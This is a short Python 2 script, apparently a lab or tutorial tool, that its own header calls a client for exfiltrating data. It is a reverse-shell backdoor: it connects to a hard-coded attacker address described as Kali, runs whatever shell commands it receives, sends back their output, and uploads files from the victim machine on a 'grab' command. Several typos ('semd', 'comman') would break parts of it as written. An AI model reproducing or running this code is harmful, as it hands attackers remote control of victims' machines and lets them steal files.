#!/usr/bin/pythonw

#========================================================
#title          :client.py
#description    :client program for exfiltrating data
#author:        :someone (I cannot remember)
#timestamp      :201511202321Z
#version        :0.0.1
#usage          :python client.py
#========================================================

import socket #for building connection
import subprocess #to start the shell in the system
import os

# In the transfer function, we first check if the file exisits in the first 
# place. If not we will notify the attacker,  otherwise, we will create a 
# loop where each time we iterate we will read 1 KB of the file and send it.
# Since the server has no idea about the end of the file we add a tag called
# 'DONE' to address this issue, finally we close the file.

def transfer(s,path):
	if os.path.exists(path):
		f = open(path, 'rb')
		packet = f.read(1024)
		while packet != '':
			s.send(packet)
			packet = f.read(1024)
		s.send('DONE')
		f.close
	else:	#the file does not exist
		s.semd('Unable to find out the file')

def connect():
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(('10.10.10.100', 8080))

	while True:	#keep receiving commands from Kali
		command = s.recv(1024)

		if 'terminate' in command:
			s.close()
			break	#close the socket
		elif 'grab' in command:
			grab,path = comman.split('*')
			try:
				transfer(s,path)
			except Exception, e:
				s.send ( str(e) )
				pass
		else:
			CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
			s.send( CMD.stdout.read() )
			s.send( CMD.stderr.read() )

def main():
	connect()

main()
